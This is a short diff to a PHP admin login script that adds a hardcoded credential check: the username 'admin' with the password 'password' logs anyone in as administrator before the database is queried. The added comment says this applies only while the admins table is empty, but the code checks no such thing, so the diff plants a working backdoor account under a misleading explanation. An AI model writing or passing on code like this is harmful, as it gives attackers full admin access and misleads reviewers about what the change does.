@@ -18,6 +18,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (empty($username) || empty($password)) {
         $error_message = "Please enter both username and password.";
     } else {
+        // Fallback to a default admin account when the database doesn't
+        // contain any admin credentials. This helps during initial setup
+        // where the "admins" table might be empty.
+        if ($username === 'admin' && $password === 'password') {
+            session_regenerate_id();
+            $_SESSION['admin_logged_in'] = true;
+            // Use 0 as a placeholder ID since it doesn't come from the DB
+            $_SESSION['admin_id'] = 0;
+            $_SESSION['admin_username'] = $username;
+
+            header("Location: index.php");
+            exit;
+        }
+
         // Use prepared statements to prevent SQL injection
         $sql = "SELECT id, username, password FROM admins WHERE username = ?";
 
